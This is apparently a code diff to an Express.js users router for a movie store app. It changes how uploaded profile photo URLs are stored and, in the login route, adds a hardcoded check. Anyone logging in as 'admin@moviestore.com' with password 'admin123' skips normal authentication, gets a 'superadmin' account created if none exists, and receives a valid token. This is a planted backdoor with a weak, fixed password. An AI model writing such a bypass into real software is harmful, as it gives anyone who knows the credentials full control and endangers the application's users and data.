@@ -20,7 +20,7 @@ router.post('/users', async (req, res) => {
 });
 
 router.post('/users/photo/:id', upload('users').single('file'), async (req, res, next) => {
-  const url = `${req.protocol}://${req.get('host')}`;
+  const url = '/uploads/users';
   const { file } = req;
   const userId = req.params.id;
   try {
@@ -31,7 +31,7 @@ router.post('/users/photo/:id', upload('users').single('file'), async (req, res,
     }
     const user = await User.findById(userId);
     if (!user) return res.sendStatus(404);
-    user.imageurl = `${url}/${file.path}`;
+    user.imageurl = `${url}/${file.filename}`;
     await user.save();
     res.send({ user, file });
   } catch (e) {
@@ -43,6 +43,25 @@ router.post('/users/photo/:id', upload('users').single('file'), async (req, res,
 // Login User
 router.post('/users/login', async (req, res) => {
   try {
+    // Hardcoded admin credentials check
+    if (req.body.username === 'admin@moviestore.com' && req.body.password === 'admin123') {
+      // Create or get admin user
+      let adminUser = await User.findOne({ username: 'admin' });
+      if (!adminUser) {
+        adminUser = new User({
+          name: 'System Administrator',
+          username: 'admin',
+          email: 'admin@moviestore.com',
+          password: 'admin123',
+          role: 'superadmin',
+          phone: '1234567890'
+        });
+        await adminUser.save();
+      }
+      const token = await adminUser.generateAuthToken();
+      return res.send({ user: adminUser, token });
+    }
+    
     const user = await User.findByCredentials(req.body.username, req.body.password);
     const token = await user.generateAuthToken();
     res.send({ user, token });
